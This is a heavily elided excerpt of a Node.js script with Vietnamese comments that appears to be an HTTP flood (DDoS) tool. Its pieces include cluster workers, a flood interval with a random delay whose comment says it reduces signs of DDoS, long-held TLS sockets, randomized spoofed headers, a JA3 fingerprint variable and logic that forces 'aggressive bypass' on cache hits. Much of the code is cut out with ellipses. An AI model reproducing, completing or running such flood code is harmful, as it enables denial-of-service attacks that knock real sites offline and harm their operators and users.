...
if (cluster.isMaster) {
  console.log("@CRISXTOP".bgRed);
    ...
    }, floodInterval + Math.floor(Math.random() * 100)); // Thêm random delay để giảm dấu hiệu DDoS
}
...
// Chỉ giữ lại các header hợp lệ, không thêm header lạ
...
Object.keys(headers).forEach(key => {
  if (headers[key] === undefined || !allowedHeaders.includes(key)) {
    ...
    const tlsSocket = tls.connect({
		...
		tlsSocket.setKeepAlive(true, 900000); // 15 phút
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setMaxListeners(0);
    tlsSocket.setTimeout(900000); // 15 phút
    return tlsSocket;
}
...
maxi = getRandomNumber(1,4)
 ...
 const key = 'custom-sec-'+ generateRandomString(1,9)
  ...
  return doiTuong;
    ...
    socket.setKeepAlive(true, 900000); // 15 phút
    socket.setTimeout(900000); // 15 phút
let ja3Fingerprint; 
    ...
    clients.forEach(client => {
      ...
      const headers2 = (currenthead) => {
		...
		client.on("close", () => {
			...
			tlsSocket.destroy();
			socket.destroy();
			if (client._pingInterval) clearInterval(client._pingInterval); // Clear ping interval khi đóng
			return 
		});
...
class Session {
    ...
    handleCacheStatus(headers) {
        ...
        if (cacheStatus === 'HIT') {
            this.cacheStrategy.bypassAttempts = this.cacheStrategy.maxBypassAttempts; // Force aggressive bypass
